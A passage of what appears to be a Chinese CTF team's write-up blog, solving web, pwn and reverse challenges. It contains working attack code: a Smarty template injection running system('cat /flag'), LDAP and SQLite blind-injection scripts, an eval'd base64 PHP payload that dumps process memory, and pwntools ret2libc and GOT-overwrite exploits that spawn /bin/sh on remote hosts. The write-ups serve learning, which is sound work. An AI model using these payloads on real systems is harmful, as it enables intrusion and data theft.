应该还是很容易看出来的，但动调拿结果能发现明显换表了，函数往里跟也不好跟，于是直接用动调拿结果\n这里构造了一个长度为 50 的输入，能够得到所有的 base64 字符\n输入：n++j'^aKgJ9*|an@@o$|8)9z#-;\u0026lt;\u0026lt;v789ghistu:/\u0026gt;^c?,/@YZ\n标准表下的输出：bisraideYUtnSjkqfGFuQEBvJHw4KTl6Iy07PDx2Nzg5Z2hpc3R1Oi8+XmM/LC9AWVo=\n这个输入就可以总结出这个题的 base 表了\nprvo9CHSJOcPIb6xRVUXQz0qBGDE72LNZduaefYT5K_8-4FAhlimjkngt1yMWs3w!\n接下来继续用动调找验证函数\n\r\n可以看到 v17 = xxx | 0x3300000000\n而最后的 call 是 MK_FP(WORD2(v17), v17)()\n结合着 32 位程序，猜测是一个天堂之门\n把调用的函数取出来，ida64 反编译一下\n\r\n这个函数大致猜测一下，显然是要求 v8 == v9[v28 - a1] 一直成立\n一开始的 do while 循环是对目标密文做了个解密，于是动调到验证的地方看一下内存\nGYldGg-iIoJlPX9hPXpjPqfdEY21B01TBTzeGqfKNR!!\n前面已经知道了 ! 就是这里 base64 的填充，于是这个字符串就是密文了\n换表 base64 的解密\n把表换回来之后的密文：\nZmxhZ3syMDIxLTEwLTA0LXlhbmd5YW5nYnVkZXlpfQ==\n明显的 flag 标志 Zmxh\n","date":"2021-12-23T22:23:17+08:00","image":"https://or4ngesec.github.io/post/kctf2021-fall-writeup-by-or4nge/cover_hufd6827b5e92508a15177056d76ff05d4_2462797_120x120_fill_box_smart1_3.png","permalink":"https://or4ngesec.github.io/post/kctf2021-fall-writeup-by-or4nge/","title":"KCTF2021 Fall Writeup by or4nge"},{"content":"* 开头题目表示赛后补题\nWeb [签到]flag 等一个一个拼出来，业余web手的笨B做题法\n[萌]odd_upload 题目描述：目录结构与官方项目example相同\n所以去查看smarty的目录结构，同时上传文件发现过滤了php相关的很多后缀，但.tpl没有过滤，同时可以控制上传的目录，所以向./templates目录上传header.tpl覆盖原有的内容，添加一句：{system('cat /flag')}，之后再重新访问题目链接就能获取flag。\n\r\nflag{1ae85554-c785-4321-8d77-0f68974929f8}\neasyinject 源码中提示了用户名为guest，密码为EC77k8RHquAMLKAX，登陆后提示\nThe flag is a special email address username.It is attribute of one account and there are multiple accounts in the directory. flag is composed of a-z0-9_\n说实话这个提示看得我云里雾里，attribute我能理解，directory是啥？\n按照常规sql注入没发现什么注入点，但是用fuzz跑的时候发现如果用户名含有'(\u0026lsquo;或者\u0026rsquo;)\u0026lsquo;就会报错：\nWarning: ldap_search(): Search: Bad search filter in /var/www/html/index.php on line 48 Warning: ldap_get_entries() expects parameter 2 to be resource, boolean given in /var/www/html/index.php on line 49 有报错就好说了，后端用的是ldap协议，flag是某个用户的用户名，可以直接用通配符*盲注，由于有多个用户，需要递归查找，exp如下：\nimport requests url = \u0026#34;http://47.106.172.144:2333/\u0026#34; alphabet = \u0026#39;abcdefghijklmnopqrstuvwxyz0123456789_\u0026#39; def search(flag): for c in alphabet: # print(flag+c+\u0026#39;*\u0026#39;) r = requests.get(url, params={\u0026#39;user\u0026#39;:flag+c+\u0026#39;*\u0026#39;, \u0026#39;pass\u0026#39;:\u0026#39;1\u0026#39;}) if \u0026#39;找不到用户\u0026#39; in r.text: pass elif \u0026#39;查询用户不唯一\u0026#39; in r.text or \u0026#39;密码错误\u0026#39; in r.text: # print(c+\u0026#39;\\n\u0026#39;+r.text) print(flag+c) search(flag+c) else: print(\u0026#39;Error: [\u0026#39;+c+\u0026#39;]\\n\u0026#39;+r.text) search(\u0026#39;\u0026#39;) *hideandseek 和web没有啥关系，和二进制全是关系。\n先附上打本地的DockerFile:\nFROMphp:8.1.0ADD ./src /var/www/htmlADD ./flag /flagWORKDIR/var/www/html/RUN chmod -R 0555 /var/www/html/CMD [\u0026#34;php\u0026#34;, \u0026#34;-S\u0026#34;, \u0026#34;0.0.0.0:8000\u0026#34;, \u0026#34;-t\u0026#34;, \u0026#34;/var/www/html\u0026#34;]这题上先读flag，然后把flag给覆盖了，你只有一次执行任意代码的机会。\n思路上来一下子就指向了/proc，进程目录，我们肯定是能通过分析这个进程把flag拿到了。目前已知的/proc的博客有：\n https://whoamianony.top/2021/06/09/Web%E5%AE%89%E5%85%A8/Proc%20%E7%9B%AE%E5%BD%95%E5%9C%A8%20CTF%20%E4%B8%AD%E7%9A%84%E5%A6%99%E7%94%A8/\nhttps://xz.aliyun.com/t/10579\n 第一反应是读fd，看看文件的符号链接，如果fopen了，但没fclose就有可能在fd里找到，本地一试发现没有。\n于是考虑利用别的，比如./exe，是一个ELF文件，但可惜strings ./exe没用，因为flag变量是在运行时读取的，生成elf是不存在这个字符串的，于是就读./mem，/proc/{PID}/mem是可用于访问进程的内存的页面。但是发现读取失败了，报错如下：\ncat mem: Input/output error 搜到了解释原因：https://unix.stackexchange.com/questions/6301/how-do-i-read-from-proc-pid-mem-under-linux\n/proc/$pid/mem显示$pid 内存的内容与进程中的映射方式相同，即伪文件中偏移x处的字节与进程中地址x处的字节相同。如果在进程中未映射地址，则从文件中的相应偏移量读取返回EIO（输入/输出错误）。例如，由于进程中的第一页永远不会被映射（因此取消引用NULL指针会完全失败，而不是无意中访问实际内存），因此读取 的第一个字节/proc/$pid/mem总是会产生 I/O 错误。\n同时也拿到了一份用python拿内存信息的脚本：\nimport re maps_file = open(\u0026#34;/proc/self/maps\u0026#34;, \u0026#39;r\u0026#39;) mem_file = open(\u0026#34;/proc/self/mem\u0026#34;, \u0026#39;rb\u0026#39;, 0) output_file = open(\u0026#34;self.dump\u0026#34;, \u0026#39;wb\u0026#39;) for line in maps_file.readlines(): # for each mapped region m = re.match(r\u0026#39;([0-9A-Fa-f]+)-([0-9A-Fa-f]+) ([-r])\u0026#39;, line) if m.group(3) == \u0026#39;r\u0026#39;: # if this is a readable region start = int(m.group(1), 16) end = int(m.group(2), 16) mem_file.seek(start) # seek to region start chunk = mem_file.read(end - start) # read region contents output_file.write(chunk) # dump contents to standard output maps_file.close() mem_file.close() output_file.close() 我盲猜flag就在内存里，但我也不是打二进制的，也不知道在哪，于是就打算把整个chunk全部正则匹配即可。\n把上述代码翻译成php，修改部分内容如下：\n\u0026lt;?php $maps_file = fopen(\u0026#34;/proc/self/maps\u0026#34;, \u0026#34;r\u0026#34;); $mem_file = fopen(\u0026#34;/proc/self/mem\u0026#34;, \u0026#34;rb\u0026#34;); while(! feof($maps_file)) { $line = fgets($maps_file);//fgets()函数从文件指针中读取一行  $m = preg_match(\u0026#34;/([0-9A-Fa-f]+)-([0-9A-Fa-f]+) ([-r])/\u0026#34;, $line, $match); if($match[3] == \u0026#39;r\u0026#39;) { $start = hexdec($match[1]); $end = hexdec($match[2]); fseek($mem_file, $start); $chunk = fread($mem_file, $end - $start); if(preg_match(\u0026#34;/flag\\{.*\\}/\u0026#34;, $chunk)) { preg_match(\u0026#34;/(flag\\{.*\\})/\u0026#34;, $chunk, $ans); var_dump($ans); } } } fclose($maps_file); fclose($mem_file); ?\u0026gt;最后用base64+urlencode传参（有了安洵杯的教训，base64一定要编码），最终payload如下：\nhttp://5b599005-3dfe-44e4-ac13-96fc3b194f3e.nssctf.neusoft.edu.cn/?eval=eval(base64_decode(%22JG1hcHNfZmlsZSA9IGZvcGVuKCIvcHJvYy9zZWxmL21hcHMiLCAiciIpOwokbWVtX2ZpbGUgPSBmb3BlbigiL3Byb2Mvc2VsZi9tZW0iLCAicmIiKTsKd2hpbGUoISBmZW9mKCRtYXBzX2ZpbGUpKSB7CiAgICAgICAgJGxpbmUgPSBmZ2V0cygkbWFwc19maWxlKTsvL2ZnZXRzKCnlh73mlbDku47mlofku7bmjIfpkojkuK3or7vlj5bkuIDooYwKICAgICAgICAgICAgJG0gPSBwcmVnX21hdGNoKCIvKFswLTlBLUZhLWZdKyktKFswLTlBLUZhLWZdKykgKFstcl0pLyIsICRsaW5lLCAkbWF0Y2gpOwogICAgICAgICAgICBpZigkbWF0Y2hbM10gPT0gJ3InKSB7CiAgICAgICAgICAgICAgICAgICAgJHN0YXJ0ID0gaGV4ZGVjKCRtYXRjaFsxXSk7CiAgICAgICAgICAgICAgICAgICAgICAgICRlbmQgPSBoZXhkZWMoJG1hdGNoWzJdKTsKICAgICAgICAgICAgICAgICAgICAgICAgZnNlZWsoJG1lbV9maWxlLCAkc3RhcnQpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGNodW5rID0gZnJlYWQoJG1lbV9maWxlLCAkZW5kIC0gJHN0YXJ0KTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKHByZWdfbWF0Y2goIi9mbGFnXHsuKlx9LyIsICRjaHVuaykpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByZWdfbWF0Y2goIi8oZmxhZ1x7LipcfSkvIiwgJGNodW5rLCAkYW5zKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyX2R1bXAoJGFucyk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KfQpmY2xvc2UoJG1hcHNfZmlsZSk7CmZjbG9zZSgkbWVtX2ZpbGUpOw%3D%3D%22)); *wschat 前后端交互用的是socket io，参数格式用的是protobuf，前端的js加了很多混淆和反调试。可以在这个网站https://lelinhtinh.github.io/de4js/做个简单的恢复后再看。\n贴一下我恢复后的还算是能看的关键代码：\n\u0026lt;html\u0026gt; ... \u0026lt;script src=\u0026#34;//cdn.bootcss.com/socket.io/2.1.1/socket.io.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;protobuf.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt; ... let sock = io.connect(\u0026#39;ws://\u0026#39; + window.location.host + \u0026#39;/\u0026#39;); var WSMessage, wsmessage, buffer; protobuf.load(\u0026#39;chat.proto\u0026#39;, function (err, _0x75e501) { if (err) throw err; LoginReq = _0x75e501.lookup(\u0026#39;wschat.chat.LoginReq\u0026#39;), RegReq = _0x75e501.lookup(\u0026#39;wschat.chat.RegReq\u0026#39;), ServerRsp = _0x75e501.lookup(\u0026#39;wschat.chat.ServerRsp\u0026#39;), MsgReq = _0x75e501.lookup(\u0026#39;wschat.chat.MsgReq\u0026#39;), LogoutReq = _0x75e501.lookup(\u0026#39;wschat.chat.LogoutReq\u0026#39;); }), window.onload = function () { let _0x1f4215 = \u0026#39;\u0026#39;, btn1 = document.getElementById(\u0026#39;btn1\u0026#39;), btn2 = document.getElementById(\u0026#39;btn2\u0026#39;), btn_send = document.getElementById(\u0026#39;btn_send\u0026#39;), user = document.getElementById(\u0026#39;user\u0026#39;), pass = document.getElementById(\u0026#39;pass\u0026#39;), txt1 = document.getElementById(\u0026#39;txt1\u0026#39;), ul1 = document.getElementById(\u0026#39;ul1\u0026#39;); btn1.onclick = function () { var _0x3689c9 = RegReq.create({ \u0026#39;username\u0026#39;: user.value, \u0026#39;password\u0026#39;: pass.value }), _0x38c60d = RegReq.encode(_0x3689c9).finish(); sock.emit(\u0026#39;reg\u0026#39;, _0x38c60d.slice().buffer); }, sock.on(\u0026#39;reg_ret\u0026#39;, (_0x77442, _0x4d8078) =\u0026gt; { _0x77442 ? alert(_0x4d8078) : alert(_0x4d8078); }), btn2.onclick = function () { if (!/^\\w{1,16}$/ [\u0026#39;test\u0026#39;](user.value)) { alert(\u0026#39;用户名不符合规范\u0026#39;); return; } if (!/^\\w{1,16}$/ [\u0026#39;test\u0026#39;](pass.value)) { alert(\u0026#39;密码不符合规范\u0026#39;); return; } var _0xea8ad4 = LoginReq.create({ \u0026#39;username\u0026#39;: user.value, \u0026#39;password\u0026#39;: pass.value }), _0x581e63 = LoginReq.encode(_0xea8ad4).finish(); sock.emit(\u0026#39;login\u0026#39;, _0x581e63.slice().buffer); }, sock.on(\u0026#39;login_ret\u0026#39;, (_0x253784, _0x4ca143) =\u0026gt; { _0x253784 ? alert(_0x4ca143) : (_0x1f4215 = user.value, alert(_0x4ca143)); }), btn_send.onclick = function () { var _0x254c70 = MsgReq.create({ \u0026#39;msg\u0026#39;: txt1.value }), _0x56ebdb = MsgReq.encode(_0x254c70).finish(); sock.emit(\u0026#39;msg\u0026#39;, _0x56ebdb.slice().buffer); }, sock.on(\u0026#39;msg\u0026#39;, (_0x2378cb, _0x4ce8f4) =\u0026gt; { let _0x3ca130 = document.createElement(\u0026#39;li\u0026#39;); _0x3ca130.innerHTML = \u0026#39;\u0026lt;h3\u0026gt;\u0026#39; + _0x2378cb + \u0026#39;\u0026lt;/h3\u0026gt;\u0026lt;p\u0026gt;\u0026#39; + _0x4ce8f4 + \u0026#39;\u0026lt;/p\u0026gt;\u0026#39;, ul1.appendChild(_0x3ca130); }), sock.on(\u0026#39;msg_ret\u0026#39;, (_0x491ba1, _0x25dec1) =\u0026gt; { if (_0x491ba1) alert(\u0026#39;发送失败：\u0026#39; + _0x25dec1); else { let _0x4a7033 = document.createElement(\u0026#39;li\u0026#39;); _0x4a7033.className = \u0026#39;mine\u0026#39;, _0x4a7033.innerHTML = \u0026#39;\u0026lt;h3\u0026gt;\u0026#39; + _0x1f4215 + \u0026#39;\u0026lt;/h3\u0026gt;\u0026lt;p\u0026gt;\u0026#39; + txt1.value + \u0026#39;\u0026lt;/p\u0026gt;\u0026#39;, ul1.appendChild(_0x4a7033), txt1.value = \u0026#39;\u0026#39;; } }); }, setInterval(function () { _0x6c017f(); }, 4000); ... \u0026lt;/script\u0026gt; \u0026lt;/html\u0026gt; 这段代码引入了socket io和protobuf，socket io有reg、reg_ret、login、login_ret、msg、msg_ret事件，传递的参数均使用protobuf打包，看一下protobuf定义文件chat.proto：\npackage wschat; message chat { message LoginReq { required string username = 1; required string password = 2; } message RegReq { required string username = 1; required string password = 2; } message ServerRsp { required int32 retcode = 1; optional string reply = 2; } message MsgReq { required string msg = 1; } message LogoutReq { } } 回到上面的代码，其中登录接口是前端校验，限制用户名密码只能为1-16位字母数字下划线，前端校验可以用burp替换为空。\n题目中提示网站为nodejs + sqlite，尝试一下sqlite注入，首先注册一个用户名密码均为admin的账户，然后用户名输入admin\u0026rsquo;，密码admin，提示数据库出错，用户名尝试admin'\u0026ndash;，提示登录成功，存在注入点。\n由于是盲注，socket io实现又很慢，只能硬撸出一个脚本。参考 https://developers.google.com/protocol-buffers/docs/pythontutorial 实现protobuf，参考 https://python-socketio.readthedocs.io/en/latest/ 实现socket io。\n在 https://developers.google.com/protocol-buffers/docs/downloads 下载protoc，然后把.proto文件编译成python文件：\nprotoc -I=chat.proto目录 --python_out=输出目录 chat.proto路径 然后运行脚本：\nimport socketio import time import string import chat_pb2 url = \u0026#39;http://4b89d5d3-7df8-4a8c-9352-08dbc410f835.nssctf.neusoft.edu.cn/\u0026#39; sio = socketio.Client() LoginReq = chat_pb2.chat.LoginReq() RegReq = chat_pb2.chat.RegReq() ServerRsp = chat_pb2.chat.ServerRsp() MsgReq = chat_pb2.chat.MsgReq() LogoutReq = chat_pb2.chat.LogoutReq() # alphabet = string.ascii_letters + string.digits + \u0026#39;{_.,}\u0026#39; # alphabet = string.printable + string.whitespace alphabet = string.ascii_lowercase + string.digits @sio.event def reg_ret(err, data): global _err, _data, recvFlag # print(err, data) _err = err _data = data recvFlag = True @sio.event def login_ret(err, data): global _err, _data, recvFlag # print(err, data) _err = err _data = data recvFlag = True @sio.event def msg(title, content): print(title, content) @sio.event def msg_ret(err, data): print(err, data) @sio.event def connect(): print(\u0026#39;connection established\u0026#39;) @sio.event def disconnect(): print(\u0026#39;disconnected from server\u0026#39;) def register(username=\u0026#39;admin\u0026#39;, password=\u0026#39;admin\u0026#39;): RegReq.username = username RegReq.password = password sio.emit(\u0026#39;reg\u0026#39;, RegReq.SerializeToString()) while not recvFlag: pass err, data = _err, _data init() return err, data def login(username=\u0026#39;admin\u0026#39;, password=\u0026#39;admin\u0026#39;): LoginReq.username = username LoginReq.password = password sio.emit(\u0026#39;login\u0026#39;, LoginReq.SerializeToString()) while not recvFlag: pass err, data = _err, _data init() return err, data def init(): global recvFlag, _err, _data recvFlag = False _err = None _data = None if __name__ == \u0026#39;__main__\u0026#39;: sio.connect(url) init() register() # payload = \u0026#34;select group_concat(tbl_name) from sqlite_master where type=\u0026#39;table\u0026#39;\u0026#34; # payload = \u0026#34;select sql from sqlite_master where type=\u0026#39;table\u0026#39; and tbl_name=\u0026#39;f16g_1s_1n_th1s_table\u0026#39;\u0026#34; payload = \u0026#34;select group_concat(f16g) from f16g_1s_1n_th1s_table\u0026#34; length = 0 for i in range(1, 100): err, data = login(\u0026#34;admin\u0026#39; and length((%s))=%d--\u0026#34;%(payload, i)) # print(err, data) if err == 1: pass elif err == 0: length = i break else: print(\u0026#39;Error!\u0026#39;, err, data) print(\u0026#39;Length:\u0026#39;, length) # length = 6 flag = \u0026#39;\u0026#39; for i in range(1, length+1): found = False for c in alphabet: err, data = login(\u0026#34;admin\u0026#39; and hex(substr((%s),%d,1))=\u0026#39;%s\u0026#39;--\u0026#34;%(payload, i, c.encode().hex())) # print(flag+c, err, data) if err == 1: pass elif err == 0: found = True flag += c print(flag) break else: print(\u0026#39;Error!\u0026#39;, err, data) if not found: flag += \u0026#39;\\0\u0026#39; # version: 3.34.0 # table: user_table,sqlite_sequence,f1ag_not_in_here,test_table,f16g_1s_1n_th1s_table # column: \u0026#34;f16g\u0026#34; TEXT # f ag 34e7472f ffcf 400d aec3 a3b4fe390c1d  # flag{34e7472f-ffcf-400d-aec3-a3b4fe390c1d} sio.disconnect() 吐槽一下，socket io是基于事件触发的，有点类似于智能合约，请求与响应没有严格的对应关系，只能把请求和响应封装成一个原子操作，模拟传统的HTTP请求，代价就是速度很慢很慢。sql注入部分就是常见的sqlite注入了，但是爆flag的时候不知道为什么有的位即使把0-255跑遍也跑不出来，猜测可能是使用了中文，一个字符不只一个字节，这种情况下的爆破时间过长，所以在脚本中如果常用字符找不到就用\\0占位，缺失的字符按照uuid的格式猜就行了。\nflag{34e7472f-ffcf-400d-aec3-a3b4fe390c1d} Pwn [签到]NssShop 随便输了个数\n\r\njustdoit 有一个汇编在调用read_long函数的最后，配合上atol可以任意往上往下更改栈的位置，利用这一点在栈上构造rop用ret2libc拿shell\nadd rbp rax 以下是exp\nfrom pwn import * context(os=\u0026#39;linux\u0026#39;, arch=\u0026#39;amd64\u0026#39;, log_level=\u0026#39;debug\u0026#39;) p = process(\u0026#34;./justdoit.1\u0026#34;) p = remote(\u0026#34;47.106.172.144\u0026#34;, 65004) elf = ELF(\u0026#34;./justdoit.1\u0026#34;) libc = ELF(\u0026#34;./libc-2.23.so\u0026#34;) pop_rdi = 0x00000000004012b3 main = 0x4011D5 p.recvuntil(\u0026#34;name?\u0026#34;) p.send(p64(main)+ p64(main) + p64(main)) p.recvuntil(\u0026#34;s??\u0026#34;) p.sendline(b\u0026#34;-24\u0026#34;) p.recvuntil(\u0026#34;name?\u0026#34;) p.send(p64(pop_rdi) + p64(elf.got[\u0026#34;puts\u0026#34;]) + p64(elf.plt[\u0026#34;puts\u0026#34;])) p.recvuntil(\u0026#34;s??\u0026#34;) p.sendline(b\u0026#34;-40\u0026#34;) libc.address = u64(p.recvuntil(\u0026#34;\\x7f\u0026#34;)[-6:].ljust(8, b\u0026#34;\\x00\u0026#34;)) - libc.sym[\u0026#34;puts\u0026#34;] print(hex(libc.address)) p.recvuntil(\u0026#34;name?\u0026#34;) p.send(p64(pop_rdi) + p64(libc.search(b\u0026#39;/bin/sh\u0026#39;).__next__()) + p64(libc.sym[\u0026#39;system\u0026#39;])) p.recvuntil(\u0026#34;s??\u0026#34;) p.sendline(b\u0026#34;-40\u0026#34;) p.interactive() \r\nreallNeedGoodLuck 任意地址四字节写， 改error的got表为main，改atoi的got表为system，撞上的几率很大，直接手动爆破就行\nfrom pwn import * context(os=\u0026#39;linux\u0026#39;, arch=\u0026#39;amd64\u0026#39;, log_level=\u0026#39;debug\u0026#39;) libc = ELF(\u0026#34;./libc-2.23.so\u0026#34;) p=remote(\u0026#34;47.106.172.144\u0026#34;, 65003) # p = process(\u0026#34;./reallNeedGoodLuck.1\u0026#34;) # gdb.attach(p) p.recvuntil(\u0026#34;good\u0026#34;) p.send(b\u0026#34;\\xa9\\x11\\x40\\x00\u0026#34;) p.recvuntil(\u0026#34;luck!\u0026#34;) p.sendline(b\u0026#34;4210744\u0026#34;) p.recvuntil(\u0026#34;good\u0026#34;) p.send(b\u0026#34;\\x00\\x00\\xa0\\xf3\u0026#34;) p.recvuntil(\u0026#34;luck!\u0026#34;) p.sendline(b\u0026#34;4210734\u0026#34;) print(hex(libc.sym[\u0026#34;system\u0026#34;])) p.send(b\u0026#34;\\x00\\x00\\x00\\x00\u0026#34;) p.sendline(b\u0026#34;/bin/sh\\x00\u0026#34;) p.send(b\u0026#34;\\x00\\x00\\x00\\x00\u0026#34;) p.sendline(b\u0026#34;/bin/sh\\x00\u0026#34;) p.interactive() \r\nReverse [签到]Signin \r\n[萌新]happyCTF s = \u0026#39;rxusoCqxw{yqK`{KZqag{r`i\u0026#39; for i in s: print(chr(ord(i)^0x14),end=\u0026#39;\u0026#39;) #flag{Welcome_to_Neusoft} Remember Crypt 4 rc4加密，根据密钥解密即可\ndef __rc4_init(key): keylength = len(key) S = list(range(256)) j = 0 for i in range(256): j = (j + S[i] + key[i % keylength]) % 256 S[i], S[j] = S[j], S[i] return S def rc4_crypt(key, data): S = __rc4_init(key) i = j = 0 result = b\u0026#39;\u0026#39; for a in data: i = (i + 1) % 256 j = (j + S[i]) % 256 S[i], S[j] = S[j], S[i] k = (a ^ S[(S[i] + S[j]) % 256]).to_bytes(1, \u0026#39;big\u0026#39;) result += k return result l = [0x9E, 0xE7, 0x30, 0x5F, 0xA7, 0x01, 0xA6, 0x53, 0x59, 0x1B, 0x0A, 0x20, 0xF1, 0x73, 0xD1, 0x0E, 0xAB, 0x09, 0x84, 0x0E, 0x8D, 0x2B] n = [] for i in l: n.append(i^0x22) from libnum import n2s, s2n def convert(k): ret = [] while k \u0026gt; 0: ret.append(k \u0026amp; 0xff) k \u0026gt;\u0026gt;= 8 return ret[::-1] print(rc4_crypt(convert(s2n(\u0026#39;12345678abcdefghijklmnopqrspxyz\u0026#39;)),n)) #flag{nice_to_meet_you} EasyRe 用信号量实现的VM，先手动反汇编\ncode = [ 17, 52, 0, 42, 5, 16, 20, 9, 23, 0, 36, 5, 3, 17, 29, 6, 0, 0, 5, 3, 17, 64, 6, 0, 72, 5, 17, 29, 23, 14, 1, 21, 4, 15, 1, 22, 2, 0, 0, 4, 3, 5, 16, 20, 50, 5, 9, 2, 19, 29, 5, 18, 21, 4, 16, 20, 61, 10, 1, 19, 52, 3, 4, 18, 14, 1, 21, 4, 7, 1, 22, 2, 0, 0, 4, 3, 5, 16, 20, 85, 5, 9, 1, 19, 64, 5, 18 ] sub_400E1D = \u0026#34;push({});\u0026#34; sub_400E78 = \u0026#34;pop({});\u0026#34; sub_400F16 = \u0026#34;{}+= {};\u0026#34; sub_400FA8 = \u0026#34;{}-= {};\u0026#34; eip = 0 # 20 eax = 0 # 16 ebx = 0 # 17 ecx = 0 # 18 edx = 0 # 19 memory = [2] * 0x1000 memory2 = [1] * 50 while eip \u0026lt; len(code): cur_op = code[eip] if cur_op == 0: cur_arg = code[eip + 1] print (\u0026#34;_%02X:\u0026#34; % (eip), sub_400E1D.format(cur_arg)) edx += 1 memory[edx] = cur_arg eip += 1 elif cur_op == 1: cur_arg = \u0026#34;eax\u0026#34; print (\u0026#34;_%02X:\u0026#34; % (eip), sub_400E1D.format(cur_arg)) edx += 1 memory[edx] = eax elif cur_op == 2: cur_arg = \u0026#34;ebx\u0026#34; print (\u0026#34;_%02X:\u0026#34; % (eip), sub_400E1D.format(cur_arg)) edx += 1 memory[edx] = ebx elif cur_op == 3: cur_arg = \u0026#34;ecx\u0026#34; print (\u0026#34;_%02X:\u0026#34; % (eip), sub_400E1D.format(cur_arg)) edx += 1 memory[edx] = ecx elif cur_op == 4: cur_arg = \u0026#34;eax\u0026#34; edx -= 1 print (\u0026#34;_%02X:\u0026#34; % eip, sub_400E78.format(cur_arg)) eax = memory[edx] elif cur_op == 5: cur_arg = \u0026#34;ebx\u0026#34; edx -= 1 print (\u0026#34;_%02X:\u0026#34; % eip, sub_400E78.format(cur_arg)) ebx = memory[edx] elif cur_op == 6: cur_arg = \u0026#34;ecx\u0026#34; edx -= 1 print (\u0026#34;_%02X:\u0026#34; % eip, sub_400E78.format(cur_arg)) ecx = memory[edx] elif cur_op == 7: eax += ebx print (\u0026#34;_%02X:\u0026#34; % eip, \u0026#34;eax += ebx;\u0026#34;) elif cur_op == 8: cur_arg = code[eip + 1] print (\u0026#34;_%02X:\u0026#34; % eip, sub_400F16.format(\u0026#34;eax\u0026#34;, cur_arg)) eax += cur_arg eip += 1 elif cur_op == 9: cur_arg = code[eip + 1] print (\u0026#34;_%02X:\u0026#34; % eip, sub_400F16.format(\u0026#34;ebx\u0026#34;, cur_arg)) ebx += cur_arg eip += 1 elif cur_op == 10: cur_arg = code[eip + 1] print (\u0026#34;_%02X:\u0026#34; % eip, sub_400F16.format(\u0026#34;ecx\u0026#34;, cur_arg)) ecx += cur_arg eip += 1 elif cur_op == 11: eax -= ebx print (\u0026#34;_%02X:\u0026#34; % eip, \u0026#34;eax -= ebx;\u0026#34;) elif cur_op == 12: cur_arg = code[eip + 1] print (\u0026#34;_%02X:\u0026#34; % eip, sub_400FA8.format(\u0026#34;eax\u0026#34;, cur_arg)) eax -= cur_arg eip += 1 elif cur_op == 13: cur_arg = code[eip + 1] print (\u0026#34;_%02X:\u0026#34; % eip, sub_400FA8.format(\u0026#34;ebx\u0026#34;, cur_arg)) ebx -= cur_arg eip += 1 elif cur_op == 14: cur_arg = code[eip + 1] print (\u0026#34;_%02X:\u0026#34; % eip, sub_400FA8.format(\u0026#34;ecx\u0026#34;, cur_arg)) eip += 1 elif cur_op == 15: eax ^= ebx print (\u0026#34;_%02X:\u0026#34; % eip, f\u0026#34;eax ^= ebx;\u0026#34;) elif cur_op == 16: zf = (eax == ebx) print (\u0026#34;_%02X:\u0026#34; % eip, f\u0026#34;zf = (eax == ebx);\u0026#34;) elif cur_op == 17: cur_arg = code[eip + 1] print (\u0026#34;_%02X:\u0026#34; % eip, f\u0026#34;push(eip+2); eip = {hex(cur_arg)};\u0026#34;) memory[edx] = eip edx += 1 eip += 1 elif cur_op == 18: edx -= 1 print (\u0026#34;_%02X:\u0026#34; % eip, f\u0026#34;pop(eip);\u0026#34;) elif cur_op == 19: cur_arg = code[eip + 1] print (\u0026#34;_%02X:\u0026#34; % eip, f\u0026#34;eip = {hex(cur_arg)};\u0026#34;) eip += 1 elif cur_op == 20: cur_arg = code[eip + 1] print (\u0026#34;_%02X:\u0026#34; % eip, f\u0026#34;if zf: eip = {hex(cur_arg)};\u0026#34;) eip += 1 elif cur_op == 21: memory[edx] = memory2[ecx] print (\u0026#34;_%02X:\u0026#34; % eip, f\u0026#34;push(memory2[ecx]);\u0026#34;) edx += 1 elif cur_op == 22: edx -= 1 memory2[ecx] = memory[edx] print (\u0026#34;_%02X:\u0026#34; % eip, f\u0026#34;pop(memory2[ecx]);\u0026#34;) elif cur_op == 23: print (\u0026#34;_%02X:\u0026#34; % eip, \u0026#34;break;\u0026#34;) eip += 1 拿到反汇编结果\n_00: push(eip+2); eip = 0x34; _02: push(42); _04: pop(ebx); _05: zf = (eax == ebx); _06: if zf: eip = 0x9; _08: break; _09: push(36); _0B: pop(ebx); _0C: push(ecx); _0D: push(eip+2); eip = 0x1d; _0F: pop(ecx); _10: push(0); _12: pop(ebx); _13: push(ecx); _14: push(eip+2); eip = 0x40; _16: pop(ecx); _17: push(72); _19: pop(ebx); _1A: push(eip+2); eip = 0x1d; _1C: break; _1D: ecx -= 1; _1F: push(memory2[ecx]); _20: pop(eax); _21: eax ^= ebx; _22: push(eax); _23: pop(memory2[ecx]); _24: push(ebx); _25: push(0); _27: pop(eax); _28: push(ecx); _29: pop(ebx); _2A: zf = (eax == ebx); _2B: if zf: eip = 0x32; _2D: pop(ebx); _2E: ebx += 2; _30: eip = 0x1d; _32: pop(ebx); _33: pop(eip); _34: push(memory2[ecx]); _35: pop(eax); _36: zf = (eax == ebx); _37: if zf: eip = 0x3d; _39: ecx += 1; _3B: eip = 0x34; _3D: push(ecx); _3E: pop(eax); _3F: pop(eip); _40: ecx -= 1; _42: push(memory2[ecx]); _43: pop(eax); _44: eax += ebx; _45: push(eax); _46: pop(memory2[ecx]); _47: push(ebx); _48: push(0); _4A: pop(eax); _4B: push(ecx); _4C: pop(ebx); _4D: zf = (eax == ebx); _4E: if zf: eip = 0x55; _50: pop(ebx); _51: ebx += 1; _53: eip = 0x40; _55: pop(ebx); _56: pop(eip); 发现其实是调用了几个函数，分别在0x34、0x40、0x1D\n0x34处的函数判断了长度，0x1D处的函数从后往前异或数字，每次加2，0x40处的函数从后往前进行加法，数字每次加1\n所以最后的加密算法为：首先从后往前 ^36, ^38, ^40，随后从后往前+0, +1, +2\u0026hellip;，最后从后往前 ^72, ^74, ^76\u0026hellip;\n反向解密即可\ns2 = [ 0xA3, 0xD8, 0xAC, 0xA9, 0xA8, 0xD6, 0xA6, 0xCD, 0xD0, 0xD5, 0xF7, 0xB7, 0x9C, 0xB3, 0x31, 0x2D, 0x40, 0x5B, 0x4B, 0x3A, 0xFD, 0x57, 0x42, 0x5F, 0x58, 0x52, 0x54, 0x1B, 0x0C, 0x78, 0x39, 0x2D, 0xD9, 0x3D, 0x35, 0x1F, 0x09, 0x41, 0x40, 